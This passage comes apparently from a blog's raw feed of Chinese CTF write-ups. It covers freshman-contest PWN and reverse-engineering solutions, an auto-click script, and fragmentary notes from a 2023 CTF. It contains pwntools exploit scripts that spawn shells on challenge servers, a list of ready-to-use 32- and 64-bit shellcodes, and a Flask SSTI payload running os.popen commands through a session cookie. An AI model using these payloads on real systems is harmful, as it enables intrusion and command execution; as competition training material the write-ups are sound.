class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26857</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#s = p.recv(numb = 2048, timeout = 3)</span></span><br><span class="line"><span class="comment">#sp = p.recv(numb = 5048, timeout = 3)</span></span><br><span class="line"><span class="comment">#print(sp)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">相关shellcode,https://blog.csdn.net/Xzzzz911/article/details/<span class="number">133468714</span></span><br><span class="line"><span class="comment"># 32位 短字节shellcode --&gt; 21字节</span></span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32位 纯ascii字符shellcode</span></span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32位 scanf可读取的shellcode</span></span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/<span class="built_in">bin</span>/sh</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64位 scanf可读取的shellcode 22字节</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64位 较短的shellcode  23字节</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64位 纯ascii字符shellcode</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h5 id="WEEK1-PWN-p1eee"><a href="#WEEK1-PWN-p1eee" class="headerlink" title="WEEK1|PWN  p1eee"></a>WEEK1|PWN  p1eee</h5><p>20+8<br><img src="/images/xinshengsai/20231102161451.png" alt="image-20220126203415648"><br>bash地址126c<br><img src="/images/xinshengsai/20231102161516.png" alt="image-20220126203415648"><br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn6&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26148</span>)</span><br><span class="line">backdoor = <span class="number">0x126C</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-easy-RE"><a href="#WEEK1-REVERSE-easy-RE" class="headerlink" title="WEEK1|REVERSE  easy_RE"></a>WEEK1|REVERSE  easy_RE</h5><p>shift+f12看一下字符串，搜一下flag，有一个<br><img src="/images/xinshengsai/20231102191446.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231102191626.png" alt="image-20220126203415648"></p><h5 id="WEEK1-REVERSE-咳"><a href="#WEEK1-REVERSE-咳" class="headerlink" title="WEEK1|REVERSE  咳"></a>WEEK1|REVERSE  咳</h5><p>使用pe查一下<br><code>https://github.com/ExeinfoASL/ASL/tree/master</code></p><p><img src="/images/xinshengsai/20231103101148.png" alt="image-20220126203415648"><br>upx的壳，<br><code>upx -d file</code>即可，然后拖到ida中，看到关键函数，对str1-1操作等于enc，双击enc，得到字符串<br><img src="/images/xinshengsai/20231103111246.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231103111338.png" alt="image-20220126203415648"><br><code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>,<br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-Segments"><a href="#WEEK1-REVERSE-Segments" class="headerlink" title="WEEK1|REVERSE   Segments"></a>WEEK1|REVERSE   Segments</h5><p> Action    name: ShowSegments  </p><p>This command opens the segments window. The format of this window is explained here.</p><p>You can use list viewer commands in this window.</p><p>In order to change the selector values, use selectors window. </p><p>中文翻译如下：</p><p>操作名称：ShowSegments</p><p>此命令打开段窗口。该窗口的格式在此处解释。</p><p>您可以在此窗口中使用列表查看器命令。</p><p>要更改选择器值，请使用选择器窗口。<br>提示了，shift+f7即可，看到<br><img src="/images/xinshengsai/20231103111817.png" alt="image-20220126203415648"></p><h5 id="WEEK1-REVERSE-ELF"><a href="#WEEK1-REVERSE-ELF" class="headerlink" title="WEEK1|REVERSE   ELF"></a>WEEK1|REVERSE   ELF</h5><p><img src="/images/xinshengsai/20231107154347.png" alt="image-20220126203415648"><br>  for ( i = 0; i &lt; strlen(a1); ++i )<br>  {<br>    v2 = v6++;<br>    v4[v2] = (a1[i] ^ 0x20) + 16;<br>  }<br>  给每一个字符亦或0x20  然后加上16<br>  <img src="/images/xinshengsai/20231107154541.png" alt="image-20220126203415648"><br>  然后base64，<br>  那么逆向的话就，先解base64 ，然后减  在亦或<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span></span><br><span class="line"></span><br><span class="line">s = base64.b64decode(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((i-<span class="number">16</span>)^<span class="number">0x20</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span></span><br></pre></td></tr></table></figure></p><h5 id="WEEK1-REVERSE-Endian"><a href="#WEEK1-REVERSE-Endian" class="headerlink" title="WEEK1|REVERSE   Endian"></a>WEEK1|REVERSE   Endian</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )<span class="comment">//数组和这个12345678亦或</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">双击<span class="built_in">array</span>，有一个数组</span><br><span class="line">.rodata:<span class="number">0000000000002010</span> <span class="built_in">array</span>           dd <span class="number">75553</span>A1Eh, <span class="number">7B</span>583A03h, <span class="number">4</span>D58220Ch, <span class="number">7B</span>50383Dh, <span class="number">736B</span>3819h</span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231107161623.png" alt="image-20220126203415648"><br>写个脚本，出理一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sums = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;75553A1E, 7B583A03, 4D58220C, 7B50383D, 736B3819&quot;</span></span><br><span class="line"></span><br><span class="line">a = a.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">    suma = <span class="built_in">int</span>(i, <span class="number">16</span>)^<span class="number">0x12345678</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(suma)[::-<span class="number">1</span>]),end=<span class="string">&quot;&quot;</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#b&#x27;flag&#x27;b&#x27;&#123;lli&#x27;b&#x27;ttl_&#x27;b&#x27;Endi&#x27;b&#x27;an_a&#x27;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-AndroXor"><a href="#WEEK1-REVERSE-AndroXor" class="headerlink" title="WEEK1|REVERSE   AndroXor"></a>WEEK1|REVERSE   AndroXor</h5><p><img src="/images/xinshengsai/20231107163630.png" alt="image-20220126203415648"><br>拖到Androidkill中，看到代码<br>也就是每个字符与happyx3进行亦或，不够的循环即可，<br>poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13 &quot;</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = s.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i])^<span class="built_in">ord</span>((key[i%<span class="number">7</span>]))), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-EzPE"><a href="#WEEK1-REVERSE-EzPE" class="headerlink" title="WEEK1|REVERSE    EzPE"></a>WEEK1|REVERSE    EzPE</h5><p>文件打不开，看一下文件十六进制头，exe的文件头为4D5A90,改一下<br><img src="/images/xinshengsai/20231107164029.png" alt="image-20220126203415648"><br><code>https://thunderjie.github.io/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/</code><br>再将90 改成80</p><p><code>shiift + e</code> ida选中数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lis = [<span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print((index ^ lis[index+1])^ lis[index] )</span></span><br><span class="line"></span><br><span class="line">    lis[index] = index ^ lis[index+<span class="number">1</span>] ^ lis[index]  <span class="comment">#lis[34] = 34 ^ lis[35] ^ lis[34]的值</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(lis)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-lazy-activtiy"><a href="#WEEK1-REVERSE-lazy-activtiy" class="headerlink" title="WEEK1|REVERSE   lazy_activtiy"></a>WEEK1|REVERSE   lazy_activtiy</h5><p>拖到andkill里直接搜flag</p><p><img src="/images/xinshengsai/20231108102413.png" alt="image-20220126203415648"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python自动点击小脚本</title>
      <link href="/2023/09/28/others/python%E8%87%AA%E5%8A%A8%E7%82%B9%E5%87%BB%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/09/28/others/python%E8%87%AA%E5%8A%A8%E7%82%B9%E5%87%BB%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl-C to end&quot;</span>)</span><br><span class="line"></span><br><span class="line">        screenWidth, screenHeight = pag.size()  <span class="comment">#获取屏幕的尺寸</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(screenWidth,screenHeight)</span><br><span class="line"></span><br><span class="line">        x,y = pag.position()   <span class="comment">#获取当前鼠标的位置</span></span><br><span class="line"></span><br><span class="line">        posStr = <span class="string">&quot;Position:&quot;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(y).rjust(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(posStr)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27;cls&#x27;</span>)   <span class="comment">#清楚屏幕</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end....&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_operation</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;点击操作&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 鼠标需要移动到的位置</span></span><br><span class="line"></span><br><span class="line">        x, y = <span class="number">1396</span>, <span class="number">850</span></span><br><span class="line"></span><br><span class="line">        x1, y1 = <span class="number">182</span>,<span class="number">24</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x1, y1)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        x2, y2 = <span class="number">120</span>,<span class="number">317</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x2, y2)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        x3, y3 = <span class="number">115</span>,<span class="number">363</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x3, y3)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">        x11, y11=<span class="number">357</span>,<span class="number">22</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x11, y11)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        x12, y12=<span class="number">97</span>,<span class="number">320</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x12, y12)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        x13, y13=<span class="number">115</span>, <span class="number">508</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x13, y13)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        x14, y14=<span class="number">160</span>,<span class="number">560</span></span><br><span class="line"></span><br><span class="line">        pyautogui.moveTo(x14, y14)</span><br><span class="line"></span><br><span class="line">        pyautogui.click()</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">click_operation()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023longjianbeiwp</title>
      <link href="/2023/09/28/CTFS/2023%E6%B3%B7%E5%89%91%E6%9D%AFwp/"/>
      <url>/2023/09/28/CTFS/2023%E6%B3%B7%E5%89%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>没了<br>tcp.flags.syn==1 and tcp.flags.ack==1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;748007e861908c03&#x27;</span></span><br><span class="line"></span><br><span class="line">hex_string = <span class="string">&#x27;b5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa&#x27;</span></span><br><span class="line"></span><br><span class="line">byte_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">decrypted_data = cipher.decrypt(byte_data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = zlib.decompress(decrypted_data,<span class="number">16</span> + zlib.MAX_WBITS)</span><br><span class="line"></span><br><span class="line">sa= <span class="built_in">str</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sa)</span><br></pre></td></tr></table></figure><p>ubuntu<br>sudo vi /etc/ssh/sshd_config</p><p>把permitrootlogin prohibit-password改成permitrootlogin yes</p><p>tcp contains “username” &amp;&amp; tcp contains “passwd”</p><p>R-studio</p><p>stikynot.exe snt 后缀</p><p>tcp contains “{&quot;errcode&quot;:200}”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py decode -s <span class="string">&quot;ssti_flask_hsfvaldb&quot;</span> -c <span class="string">&quot;.eJwdx1EKwyAMANCrDEGiPz1Ar1KGZBi7gBpplH2Idy_d-3vTDKWrYiGzm2k5vZRUWeo2WsRObkLKeMKeuekoB4RwZvlg1hDg_S917lSeOhAFf0CTRvXp7ytYGPx2EUbnl7drWqqRk11m3cGmKw0.YpIQcw.J5vs8t8bAr0xDIxF6EqUAH2kkLE&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;%if session.update(&#123;&#x27;flag&#x27;:lipsum[&#x27;__globals__&#x27;][&#x27;__getitem__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python .\flask_session_cookie_manager3.py decode -s <span class="string">&quot;ssti_flask_hsfvaldb&quot;</span> -c <span class="string">&quot;.eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;red\n&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;%if session.update(&#123;&#x27;flag&#x27;:lipsum[&#x27;__globals__&#x27;][&#x27;__getitem__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
